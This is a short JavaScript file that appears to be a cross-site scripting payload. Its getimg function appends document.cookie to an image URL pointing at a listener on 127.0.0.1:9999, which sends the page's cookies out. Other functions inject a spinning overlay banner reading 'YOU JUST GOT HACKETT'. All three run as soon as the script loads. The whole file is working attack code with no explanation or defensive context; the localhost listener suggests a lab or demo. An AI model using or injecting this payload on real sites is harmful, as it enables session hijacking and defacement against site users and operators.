function getimg() {
    let img = document.createElement('img');
    img.src = 'http://127.0.0.1:9999/' + document.cookie;
    document.body.appendChild(img);
}

function addcss(css){
    var head = document.getElementsByTagName('head')[0];
    var s = document.createElement('style');
    s.setAttribute('type', 'text/css');
    s.appendChild(document.createTextNode(css));
    head.appendChild(s);
}

function yougotgotten() {
    const box = document.createElement('div');

    box.style.position = 'fixed';
    box.style.top = '0';
    box.style.left = '0';
    box.style.width = '100%';
    box.style.height = '100px';
    box.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
    box.style.color = 'white';
    box.style.display = 'flex';
    box.style.alignItems = 'center';
    box.style.justifyContent = 'center';
    box.style.zIndex = '9999';
    box.style.animation = 'rotateGrow 10s infinite linear';

    box.innerHTML = 'YOU JUST GOT HACKETT';

    document.body.appendChild(box);
}

const css = `@keyframes rotateGrow {
    0% {
        transform: rotate(0deg) scale(1);
    }
    100% {
        transform: rotate(360deg) scale(1.5);
    }
}
`;

getimg();

addcss(css);

yougotgotten();
